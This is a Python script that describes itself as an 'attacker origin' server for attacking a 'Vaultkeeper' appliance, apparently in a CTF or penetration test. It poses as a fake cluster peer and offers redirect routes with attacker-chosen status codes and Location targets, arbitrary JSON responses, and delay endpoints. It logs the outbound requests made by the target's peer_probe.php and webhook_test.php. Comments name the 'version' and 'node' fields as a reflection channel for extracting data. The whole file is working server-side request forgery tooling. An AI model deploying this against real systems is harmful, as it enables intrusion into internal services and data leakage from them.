#!/usr/bin/env python3
"""
Vaultkeeper attacker origin. redir.py only answers 418 + Location. This also
plays a fake cluster peer, so we can see what peer_probe.php and
webhook_test.php send outbound and pick what they get back.

Routes, all methods:
    /r/<raw target url>        418 + Location: <raw target>     redir.py compatible
    /R/<b64url target url>     418 + Location: <decoded>        safe for ?& in the target
    /S/<code>/<b64url target>  <code> + Location: <decoded>     pick the status
    /j/<b64url json body>      200 application/json with that body
"""
import base64
import json
import os
import socket
import sys
import threading
import time

PORT = int(sys.argv[1]) if len(sys.argv) > 1 else 9998
HERE = os.path.dirname(os.path.abspath(__file__))
LOGF = os.path.join(HERE, "peer_srv.log")

# The default body a "peer node" answers with. peer_probe pulls $j['version']
# or $j['node'] out of this and echoes it back through the regex
# ^[\w.\-]{1,32}$ , so these two keys are the reflection channel.
DEFAULT_PEER = {
    "service": "vk-keyring",
    "appliance": "vaultkeeper",
    "version": "4.2.1",
    "node": "node-b",
    "slot": "operator",
    "seal": "open",
    "unseal": "ok",
    "handshake": "ok",
    "peer_ok": True,
    "alg": "aes-128-gcm",
}


def b64d(s):
    s = s.strip()
    return base64.urlsafe_b64decode(s + "=" * (-len(s) % 4)).decode("utf-8", "replace")


def log(entry):
    entry["t"] = time.time()
    line = json.dumps(entry)
    with open(LOGF, "a") as f:
        f.write(line + "\n")
    print("[<] " + line[:600], flush=True)


def respond(c, code, reason, headers, body=b""):
    head = "HTTP/1.1 %d %s\r\n" % (code, reason)
    for k, v in headers:
        head += "%s: %s\r\n" % (k, v)
    head += "Content-Length: %d\r\nConnection: close\r\n\r\n" % len(body)
    c.sendall(head.encode("latin1") + body)


def handle(c, addr):
    try:
        c.settimeout(8)
        data = b""
        while b"\r\n\r\n" not in data and len(data) < 65536:
            chunk = c.recv(4096)
            if not chunk:
                break
            data += chunk
        if not data:
            return
        head, _, rest = data.partition(b"\r\n\r\n")
        lines = head.decode("latin1").split("\r\n")
        reqline = lines[0]
        headers = {}
        for h in lines[1:]:
            if ":" in h:
                k, v = h.split(":", 1)
                headers[k.strip().lower()] = v.strip()
        # pull the body if there's one, so a POST from webhook_test is captured
        clen = int(headers.get("content-length", "0") or 0)
        body = rest
        while len(body) < clen and len(body) < 262144:
            chunk = c.recv(4096)
            if not chunk:
                break
            body += chunk
        parts = reqline.split(" ")
        method = parts[0] if parts else "?"
        path = parts[1] if len(parts) > 1 else "/"
        log({"peer": addr[0], "req": reqline, "method": method, "path": path,
             "headers": headers, "body": body.decode("utf-8", "replace")[:4000]})

        if path.startswith("/r/"):
            respond(c, 418, "Teapot", [("Location", path[3:])])
        elif path.startswith("/R/"):
            respond(c, 418, "Teapot", [("Location", b64d(path[3:].split("?")[0]))])
        elif path.startswith("/S/"):
            _, _, code, enc = path.split("/", 3)
            respond(c, int(code), "X", [("Location", b64d(enc.split("?")[0]))])
        elif path.startswith("/j/"):
            payload = b64d(path[3:].split("?")[0]).encode()
            respond(c, 200, "OK", [("Content-Type", "application/json")], payload)
        elif path.startswith("/slow/"):
            time.sleep(min(20.0, float(path.split("/")[2].split("?")[0])))
            respond(c, 200, "OK", [("Content-Type", "application/json")], b"{}")
        else:
            payload = json.dumps(DEFAULT_PEER).encode()
            respond(c, 200, "OK", [("Content-Type", "application/json")], payload)
    except Exception as e:  # noqa: BLE001
        try:
            log({"peer": addr[0], "error": repr(e)})
        except Exception:
            pass
    finally:
        try:
            c.close()
        except Exception:
            pass


def main():
    s = socket.socket()
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.bind(("0.0.0.0", PORT))
    s.listen(128)
    print("peer_srv listening on %d, log %s" % (PORT, LOGF), flush=True)
    while True:
        c, a = s.accept()
        threading.Thread(target=handle, args=(c, a), daemon=True).start()


if __name__ == "__main__":
    main()
